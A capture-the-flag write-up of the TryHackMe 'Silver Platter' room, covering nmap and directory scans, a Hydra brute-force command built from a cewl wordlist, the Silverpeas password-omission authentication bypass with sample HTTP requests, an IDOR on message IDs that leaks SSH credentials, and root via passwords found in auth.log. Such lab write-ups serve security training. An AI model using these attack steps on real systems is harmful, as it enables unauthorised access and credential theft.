---
title: "TryHackMe: Silver Platter"
categories: [TryHackMe]
tags: [IDOR,cve]
render_with_liquid: false
img_path: /images/tryhackme_silverplatter/
image:
  path: banner.png
---

Can you breach the server?

Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's your chance to prove them wrong. Dive into their web server, find the hidden flags, and show the world your elite hacking skills. Good luck, and may the best hacker win!
But beware, this won't be a walk in the digital park. Hack Smarter Security has fortified the server against common attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are). The hacking gauntlet has been thrown, and it's time to elevate your game. Remember, only the most ingenious will rise to the top. 

May your code be swift, your exploits flawless, and victory yours!

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}
<https://tryhackme.com/r/room/silverplatter>
  
## Reconnaissance 

We begin with an Nmap scan and discover three open ports: Port 22, hosting an SSH service; Port 80, serving an nginx web server and Port 8080, running another web server.

```console
nmap -T5 -A -p- --open --max-scan-delay 100s 10.10.63.140
```
![](nmap.png){: width="1145" height="678"}

To map the target domain silverplatter.thm to its IP address, use the following comm and in terminal

```console
echo "<YOUR MACHINE_IP> silverplatter.thm" | sudo tee -a /etc/hosts
```

## Findings on Ports

Upon navigating to http://silverplatter.thm, the web server on port 80 displays a landing page for "Hack Smarter Security", which appears to be a cybersecurity company, there's nothing interesting we could gather from here except on Contact Page

![](site.png){: width="1162" height="653"}

Under Contact we find a possible user who is a project manager for Silverpeas.

![](contact.png){: width="664" height="357"}

This hints that the web application running on the target machine could be powered by or related to Silverpeas. We keep this reference for later.

[Silverpeas](https://www.silverpeas.org/intro.html) is known for providing a wide array of collaborative tools, such as document sharing, project management, and discussion forums. 

![](silverpeas_google.png){: width="1062" height="431"}

Whilst enumerating directories on the web server running on port 80 with Feroxbuster, we didn’t come across anything useful or interesting.

```console
feroxbuster -u 'http://silverplatter.thm' -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 60
```
![](ferox1.png){: width="1155" height="787"}

Accessing the website on port 8080, we find that the index page is empty, offering no content or useful information. When navigating to /website, the server redirects us to **/website/**, but this path is restricted and returns a "**Forbidden**" error. This suggests potential misconfigurations or hidden resources worth investigating further.

```console
feroxbuster -u 'http://silverplatter.thm:8080' -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 60
```
![](ferox2.png){: width="1088" height="533"}

![](404.png){: width="1920" height="287"}

![](forbidden.png){: width="1918" height="334"}


## Initial Access

Despite the lack of findings, the contact form provides a reference to Silverpeas. Using this clue, we try accessing http://silverpeas.thm:8080/silverpeas/ and discover a login page for Silverpeas. There are some known CVEs for this software, we'll get to this later.

## Brute-forcing with Hydra

```console
http://silverpeas.thm:8080/silverpeas
```
![](login.png){: width="1520" height="754"}

Since we have a username from contact form, we could try to brute-force the login using [hydra](https://github.com/vanhauser-thc/thc-hydra). As the room description gives us the clue, rockyou.txt may not be the help here, but we can create a wordlist using the words on the http://silverplatter.thm page. We use [cewl](https://github.com/digininja/CeWL) to do this.

## Enumeration

```console
cewl http://silverplatter.thm > pass.txt
```
![](cewl.png){: width="1497" height="359"}

Now, we intercept and analyze a login request using Burp to gather the necessary information for crafting our Hydra command. This involves capturing the HTTP POST request sent when attempting to log in, identifying critical details such as the target URL, form parameters, and the server's response to incorrect credentials. 

![](burp.png){: width="1571" height="308"}

Analyzing Key Components:

- Target: silverplatter.thm
- Port: 8080
- Form Path: /silverpeas/AuthenticationServlet
- Parameters: Login, Password, DomainId
- Failure Condition: The response contains “Login or password incorrect.”

Using the information gathered, the Hydra command can be constructed as follows:

```console
hydra -l scr1ptkiddy -P pass.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect" -V
```
![](hydra.png){: width="1431" height="715"}

Log in to the Silverpeas using the credentials we just obtained.

![](silverpeas.png){: width="1919" height="928"}

## CVE Method

[Exploit Title: Silverpeas CRM - Authentication Bypass](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d)

Silverpeas up to and including 6.3.4 is vulnerable to a trivial authentication bypass. When authenticating, if the sender omits the password form field, the application will sign you in as the user specified without any challenge.

E.g. the standard login request will look like this:

```POST /silverpeas/AuthenticationServlet HTTP/2
Host: 212.129.58.88
Content-Length: 28
Origin: https://212.129.58.88
Content-Type: application/x-www-form-urlencoded

Login=SilverAdmin&Password=SilverAdmin&DomainId=0
```
This will fail login (unless they have forgotten to change the default password) and you will be redirected back to the login page with an error code.

But if you remove the password field like this:

```POST /silverpeas/AuthenticationServlet HTTP/2
Host: 212.129.58.88
Content-Length: 28
Origin: https://212.129.58.88
Content-Type: application/x-www-form-urlencoded

Login=SilverAdmin&DomainId=0
```

Then the login attempt will (usually) succeed and redirect you to the main page, now logged in as a super admin.

The bug works with any valid user, but SilverAdmin is the default super admin.

**Cause**

The issue was a failure in how the app handled different login methods. The code that authenticated the user by username would assume if a password had not been sent then it was a SSO-based login, where no password was required. This was patched as bug #14156, where they set an 'remotely authenticated' flag intially and check that later rather than just checking if the password value is null: (https://github.com/Silverpeas/Silverpeas-Core/commit/11fb5e21c252ce4751b85fccf5b8076156e0b4f0)

We intercept a login request for the user scr1ptkiddy using Burp Suite, remove the password parameter, and then forward the request.

![](cve.png){: width="1564" height="292"}


## Shell as Tim

After successfully logging in as the user scr1ptkiddy, we observe a single notification within the Silverpeas platform

![](notification.png){: width="1522" height="755"}

This endpoint appeared to display a message based on the value of the ID parameter. Examining the notification, we noticed it referenced the ReadMessage.jsp endpoint. The ID parameter, set to 5, corresponded to the notification.

![](message.png){: width="966" height="363"}

## Analyzing the IDOR Vulnerability

The key question was whether the application validated user permissions for the ID parameter. To test for [IDOR](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html), we modified the ID parameter in the URL to different values. For example:

```console
http://silverplatter.thm:8080/silverpeas/RSILVERMAIIL/jsp/ReadMessage.jsp?ID=6
```
Instead of returning an error or denying access, the application displayed a message associated with ID=6. This confirmed that the server did not validate whether the logged-in user had permissions to access the message. By incrementing or decrementing the ID value, we could access messages belonging to other users.

![](idor.png){: width="1920" height="919"}

![](idor2.png){: width="1919" height="945"}

With these credentials, we use it to log in via SSH and retrieve user flag.

![](ssh.png){: width="1407" height="790"}

![](user_flag.png){: width="1438" height="158"}

## Root Shell

When inspecting Tim's user groups, we noticed that he belongs to the adm group. Membership in this group grants access to system logs, typically located in /var/log. Upon disccovering /etc/passwd, we discovered another user Tyler who has root access.

![](id.png){: width="1338" height="688"}

We search for entries of the user tyler.

![](auth.png){: width="1312" height="799"}

```console
grep "tyler" auth.log* | grep "password"
```
![](grep.png){: width="1487" height="704"}

We found Tyler credentials in auth.log

![](tyler_pass.png){: width="1508" height="208"}

With the credentials, we switched user to Tyler. When checking sudo privileges for Tyler, it seems that we have full access. 

![](sudo.png){: width="1469" height="219"}

With this, we use sudo to escalate and retrieve root flag.

![](root_flag.png){: width="1571" height="308"}